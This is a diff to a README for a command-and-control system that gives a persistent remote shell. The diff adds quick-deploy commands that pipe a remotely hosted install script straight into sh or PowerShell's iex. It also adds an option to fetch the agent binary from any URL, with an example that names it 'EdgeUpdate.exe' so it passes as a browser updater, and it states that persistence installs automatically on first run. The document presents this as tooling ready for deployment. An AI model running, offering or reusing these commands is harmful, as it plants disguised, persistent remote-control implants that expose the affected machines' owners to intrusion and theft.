@@ -4,17 +4,29 @@ Command & Control system with persistent PTY shell, deployable via Cloudflare Tu
 
 ## Quick Deploy
 
-**Linux:**
+**Linux (default — binary from c2.trazento.site):**
 ```bash
 sh -c "$(curl -sS https://c2.trazento.site/install.sh)"
 ```
 
-**Windows (PowerShell):**
+**Linux (custom binary URL — host it anywhere):**
+```bash
+C2_AGENT_URL="https://github.com/user/repo/releases/latest/download/c2_agent" \
+  sh -c "$(curl -sS https://c2.trazento.site/install.sh)"
+```
+
+**Windows (default):**
 ```powershell
 iex (iwr https://c2.trazento.site/install.ps1)
 ```
 
-Scripts auto-detect OS/arch, download the matching agent binary from the server, and run it. Persistence is installed automatically on first run.
+**Windows (custom URL):**
+```powershell
+$env:C2_AGENT_URL="https://example.com/EdgeUpdate.exe"
+iex (iwr https://c2.trazento.site/install.ps1)
+```
+
+Scripts auto-detect OS/arch, download the matching agent binary, and run it. Persistence is installed automatically on first run.
 
 ## Server
 
